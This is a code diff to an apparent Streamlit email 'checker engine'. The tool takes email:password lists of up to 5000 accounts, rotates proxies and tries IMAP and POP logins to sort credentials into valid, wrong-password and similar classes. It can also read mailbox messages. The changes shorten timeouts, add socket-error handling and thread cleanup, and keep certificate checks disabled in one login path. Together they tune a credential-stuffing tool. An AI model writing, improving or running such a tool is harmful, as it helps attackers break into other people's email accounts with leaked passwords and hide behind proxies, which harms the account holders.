@@ -249,7 +249,6 @@ def instant_help(key_name, description_text, label_text, widget_type="label", **
 # --- Sidebar Control Panel & Tri-Mode Selector ---
 str_lit.sidebar.header("⚙ Engine Control Panel")
 
-# --- Mode Selection (3 Modes: Normal Mode [Default], Fast Mode, Deep / Aggressive Mode) ---
 checker_mode = str_lit.sidebar.selectbox(
     "⚡ Select Engine Mode:",
     options=["Normal Mode", "Fast Mode", "Deep / Aggressive Mode"],
@@ -275,27 +274,27 @@ elif checker_mode == "Deep / Aggressive Mode":
         mode_name="Deep",
         fast_mode=False,
         max_concurrent_checks=30,
-        connect_timeout=15.0,
-        read_timeout=15.0,
+        connect_timeout=10.0,
+        read_timeout=10.0,
         max_retries=4,
         failure_cooldown=10.0
     )
     workers = str_lit.sidebar.slider("Workers Start", min_value=1, max_value=50, value=15, step=1)
     deadline = str_lit.sidebar.slider("Deadline (Seconds)", min_value=10, max_value=180, value=45, step=5)
-    timeout = str_lit.sidebar.slider("Timeout", min_value=5, max_value=45, value=15, step=1)
+    timeout = str_lit.sidebar.slider("Timeout", min_value=5, max_value=45, value=10, step=1)
 else:  # Normal Mode (Default)
     engine_config = CheckerConfig(
         mode_name="Normal",
         fast_mode=False,
         max_concurrent_checks=50,
-        connect_timeout=8.0,
-        read_timeout=8.0,
+        connect_timeout=5.0,
+        read_timeout=5.0,
         max_retries=2,
         failure_cooldown=30.0
     )
     workers = str_lit.sidebar.slider("Workers Start", min_value=1, max_value=75, value=30, step=5)
     deadline = str_lit.sidebar.slider("Deadline (Seconds)", min_value=5, max_value=90, value=25, step=5)
-    timeout = str_lit.sidebar.slider("Timeout", min_value=2, max_value=20, value=8, step=1)
+    timeout = str_lit.sidebar.slider("Timeout", min_value=2, max_value=20, value=5, step=1)
 
 max_acc = str_lit.sidebar.slider("Max Accounts", min_value=0, max_value=5000, value=5000, step=100)
 blacklist_cf = str_lit.sidebar.slider("Blacklist CF", min_value=0, max_value=500, value=100, step=10)
@@ -1277,7 +1276,7 @@ def ssl_wrap(sock, host, insecure=False):
 def classify_error(err, domain=""):
     try:
         err_str = str(err).lower()
-        if any(x in err_str for x in ["proxy connect failed", "timed out", "timeout", "connection refused", "network is unreachable", "name or service not known", "gaierror", "sockatmark", "reset by peer", "broken pipe", "fast-fail dns check failed"]):
+        if any(x in err_str for x in ["proxy connect failed", "timed out", "timeout", "connection refused", "network is unreachable", "name or service not known", "gaierror", "sockatmark", "reset by peer", "broken pipe", "fast-fail dns check failed", "socket.timeout", "connectionrefusederror"]):
             return "connection_failed"
         if domain in ZERO_ACCESS_PROVIDERS or any(k in err_str for k in ["zero-access", "bridge", "local connection"]):
             return "need_app_password"
@@ -1318,9 +1317,16 @@ def imap_once(email, password, server, proxy_str=None, insecure=False):
         def open(self, host="", port=993, timeout=None):
             raw = None
             try:
-                raw = proxy_connect(host, port, proxy_str) if proxy_str else socket.create_connection((host, port), timeout=timeout or CFG["TIMEOUT"])
+                raw = proxy_connect(host, port, proxy_str, timeout=timeout) if proxy_str else socket.create_connection((host, port), timeout=timeout or CFG["TIMEOUT"])
                 raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                 self.sock = ssl_wrap(raw, host, insecure=insecure)
+            except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as socket_ex:
+                if raw:
+                    try: raw.shutdown(socket.SHUT_RDWR)
+                    except Exception: pass
+                    try: raw.close()
+                    except Exception: pass
+                raise socket_ex
             except Exception as ex:
                 if raw:
                     try: raw.shutdown(socket.SHUT_RDWR)
@@ -1337,6 +1343,11 @@ def imap_once(email, password, server, proxy_str=None, insecure=False):
         except Exception: pass
         try: mail.logout()
         except Exception: pass
+    except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as socket_ex:
+        if mail:
+            try: mail.logout()
+            except Exception: pass
+        raise socket_ex
     except Exception as e:
         if mail:
             try: mail.logout()
@@ -1348,7 +1359,7 @@ def pop_once(email, password, server, proxy_str=None, insecure=False):
     ssock = None
     mail = None
     try:
-        raw = proxy_connect(server, 995, proxy_str) if proxy_str else socket.create_connection((server, 995), timeout=CFG["TIMEOUT"])
+        raw = proxy_connect(server, 995, proxy_str, timeout=CFG["TIMEOUT"]) if proxy_str else socket.create_connection((server, 995), timeout=CFG["TIMEOUT"])
         raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
         ssock = ssl_wrap(raw, server, insecure=insecure)
         mail = poplib.POP3_SSL(server, timeout=CFG["TIMEOUT"])
@@ -1360,6 +1371,16 @@ def pop_once(email, password, server, proxy_str=None, insecure=False):
         except Exception: pass
         try: mail.quit()
         except Exception: pass
+    except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as socket_ex:
+        if mail:
+            try: mail.quit()
+            except Exception: pass
+        if raw and not ssock:
+            try: raw.shutdown(socket.SHUT_RDWR)
+            except Exception: pass
+            try: raw.close()
+            except Exception: pass
+        raise socket_ex
     except Exception as e:
         if mail:
             try: mail.quit()
@@ -1381,9 +1402,16 @@ def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
                 def open(self, host="", port=993, timeout=None):
                     raw = None
                     try:
-                        raw = proxy_connect(host, port, proxy_str) if proxy_str else socket.create_connection((host, port), timeout=10)
+                        raw = proxy_connect(host, port, proxy_str, timeout=10) if proxy_str else socket.create_connection((host, port), timeout=10)
                         raw.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                         self.sock = ssl_wrap(raw, host, insecure=True)
+                    except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as socket_ex:
+                        if raw:
+                            try: raw.shutdown(socket.SHUT_RDWR)
+                            except Exception: pass
+                            try: raw.close()
+                            except Exception: pass
+                        raise socket_ex
                     except Exception as ex:
                         if raw:
                             try: raw.shutdown(socket.SHUT_RDWR)
@@ -1394,10 +1422,10 @@ def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
             mail = PIMAPVerify(h, timeout=10)
             mail.login(target_email.strip(), target_pass.strip())
             return True, mail, h
-        except Exception:
+        except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError):
             raw_conn = None
             try:
-                raw_conn = proxy_connect(h, 143, proxy_str) if proxy_str else socket.create_connection((h, 143), timeout=10)
+                raw_conn = proxy_connect(h, 143, proxy_str, timeout=10) if proxy_str else socket.create_connection((h, 143), timeout=10)
                 raw_conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                 mail = imaplib.IMAP4()
                 mail.sock = raw_conn
@@ -1412,6 +1440,8 @@ def verify_and_connect(target_email, target_pass, hosts, proxy_str=None):
                     try: raw_conn.close()
                     except Exception: pass
                 continue
+        except Exception:
+            continue
     return False, None, ""
 
 def read_mailbox_messages(email, password, server, proxy_str=None, limit=10):
@@ -1494,8 +1524,14 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     imap_once(email, password, server, current_px, insecure=prefer_insecure)
                     record_proxy_attempt(current_px, success=True)
                     return server, "valid", f"IMAP | Host: {server} | Port: 993", current_px, trace_logs
+                except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as sock_err:
+                    st_val = classify_error(sock_err, domain)
+                    record_proxy_attempt(current_px, success=False, is_network_error=True)
+                    trace_logs.append(f"-> SOCKET FAILED IMAP on {server}: {str(sock_err)[:50]} [Classified: {st_val}]")
+                    if st_val in ("wrong_password", "need_app_password"):
+                        return None, st_val, f"IMAP {server} -> {st_val}", current_px, trace_logs
                 except Exception as e:
-                    st_val = classify_error(str(e), domain)
+                    st_val = classify_error(e, domain)
                     is_net = (st_val == "connection_failed")
                     record_proxy_attempt(current_px, success=False, is_network_error=is_net)
                     trace_logs.append(f"-> FAILED IMAP on {server}: {str(e)[:50]} [Classified: {st_val}]")
@@ -1508,8 +1544,14 @@ def check_account_sync(email, password, conf, domain, proxy_pool, thread_state, 
                     pop_once(email, password, server, current_px, insecure=prefer_insecure)
                     record_proxy_attempt(current_px, success=True)
                     return server, "valid", f"POP | Host: {server} | Port: 995", current_px, trace_logs
+                except (socket.timeout, socket.error, ConnectionRefusedError, ssl.SSLError) as sock_err:
+                    st_val = classify_error(sock_err, domain)
+                    record_proxy_attempt(current_px, success=False, is_network_error=True)
+                    trace_logs.append(f"-> SOCKET FAILED POP on {server}: {str(sock_err)[:50]} [Classified: {st_val}]")
+                    if st_val in ("wrong_password", "need_app_password"):
+                        return None, st_val, f"POP {server} -> {st_val}", current_px, trace_logs
                 except Exception as e:
-                    st_val = classify_error(str(e), domain)
+                    st_val = classify_error(e, domain)
                     is_net = (st_val == "connection_failed")
                     record_proxy_attempt(current_px, success=False, is_network_error=is_net)
                     trace_logs.append(f"-> FAILED POP on {server}: {str(e)[:50]} [Classified: {st_val}]")
@@ -1614,6 +1656,13 @@ if start_engine_btn:
                 return {"line": f"{email}:{password} | {detail}", "email": email, "password": password, "status": status, "detail": detail, "trace": trace}
             except Exception as ex:
                 return {"line": f"{line} | Error: {ex}", "email": line, "password": "", "status": "connection_failed", "detail": str(ex), "trace": [str(ex)]}
+            finally:
+                # Thread-safe cleanup block ensuring local handles/locks are cleanly reset
+                if hasattr(thread_local, "state"):
+                    try:
+                        thread_local.state.clear()
+                    except Exception:
+                        pass
 
         try:
             current_workers = CFG["MAX_WORKERS_START"]
